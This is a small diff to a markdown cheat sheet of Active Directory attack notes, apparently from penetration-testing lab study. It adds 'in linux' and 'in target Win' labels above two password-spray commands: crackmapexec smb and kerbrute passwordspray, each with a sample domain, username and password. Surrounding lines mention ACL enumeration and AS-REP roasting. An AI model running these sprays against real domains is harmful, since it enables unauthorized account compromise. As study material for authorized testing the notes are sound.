@@ -75,8 +75,10 @@ Get-ObjectAcl -Identity "Management Department" | ? {$_.ActiveDirectoryRights -e
 ##### PasswdAttack
 ###### Passwd Spray
 ```
+in linux
 crackmapexec smb 192.168.50.75 -u dave -p 'Flowers1' -d corp.com
 
+in target Win
 .\kerbrute_windows_amd64.exe passwordspray -d corp.com .\usernames.txt "Nexus123!"
 ```
 ###### PAS-REQ reoasting  
